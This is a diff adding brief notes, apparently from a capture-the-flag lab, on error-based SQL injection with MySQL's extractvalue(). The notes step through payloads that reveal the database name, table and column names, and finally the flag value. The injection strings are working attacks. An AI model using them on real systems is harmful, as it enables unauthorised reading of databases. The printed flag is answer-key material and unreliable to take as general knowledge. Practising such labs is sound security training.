@@ -1,0 +1,28 @@
+normaltic' and extractvalue() and '1' = '1
+
+normaltic' and extractvalue('1', concat(0x3a, (__SQL__))) and '1' = '1
+
+select database()
+
+4. normaltic' and extractvalue('1', concat(0x3a, (select database()))) and '1' = '1
+database명 : sqli_2
+
+
+5. 
+select table_name from information_schema.tables where table_schema='sqli_2' limit 0,1
+
+normaltic' and extractvalue('1', concat(0x3a, (select table_name from information_schema.tables where table_schema='sqli_2' limit 0,1))) and '1' = '1
+table명 : flag_table, member
+
+6.
+select column_name from information_schema.columns where table_name='flag_table' limit 0,1
+
+normaltic' and extractvalue('1', concat(0x3a, (select column_name from information_schema.columns where table_name='flag_table' limit 0,1))) and '1' = '1
+
+flag_table -> flag
+
+7.
+select flag from flag_table limit 0,1
+
+normaltic' and extractvalue('1', concat(0x3a, (select flag from flag_table limit 0,1))) and '1' = '1
+segfault{Basic_Basic_ErrorSQLi}
